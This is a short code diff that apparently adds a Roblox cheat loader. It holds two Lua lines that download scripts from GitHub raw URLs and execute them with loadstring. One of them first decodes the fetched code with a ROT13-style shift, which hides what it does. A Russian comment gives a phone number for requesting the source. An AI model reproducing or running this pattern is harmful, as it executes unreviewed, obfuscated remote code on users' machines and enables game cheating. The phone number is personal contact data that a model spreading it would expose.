@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))() --THIS SCRIPT IS NOT MINE, IT BELONGS TO ITS RIGHTFUL OWNER.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CREEP-fmg/MAINSCRIPTS/refs/heads/main/MAINMANIPULATOR.txt"):gsub("%a",function(c)local b=c:byte()return string.char(b>96 and(b-84)%26+97 or(b-52)%26+65)end))()
+
+--[ ЕСЛИ ЗАХОТИТЕ ПОЛУЧИТЬ MAINMANIPULATOR ИСХОДНЫЙ КОД ПОЖАЛУЙСТА ПРОЧИТАЙТЕ ЛИЦЕНЗИОННОЕ СОГЛАШЕНИЕ И ПИШИТЕ В МАКС ПО НОМЕРУ +79066050099 ]
